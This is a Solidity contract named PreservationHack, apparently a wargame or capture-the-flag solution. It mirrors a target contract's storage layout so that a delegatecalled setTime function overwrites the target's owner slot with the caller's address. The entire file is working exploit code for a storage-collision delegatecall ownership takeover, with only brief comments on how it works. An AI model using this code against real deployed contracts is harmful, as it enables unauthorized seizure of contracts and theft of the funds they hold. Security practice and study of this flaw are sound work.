// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationHack {
    // Copy storage layout from Preservation
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(
        uint256 /* _time */
    ) public {
        // overwrites the same storage slot as Preservation.owner() when delegatecalled
        // msg.sender will be retained as the eoa since delegatecalled
        owner = msg.sender;
    }
}
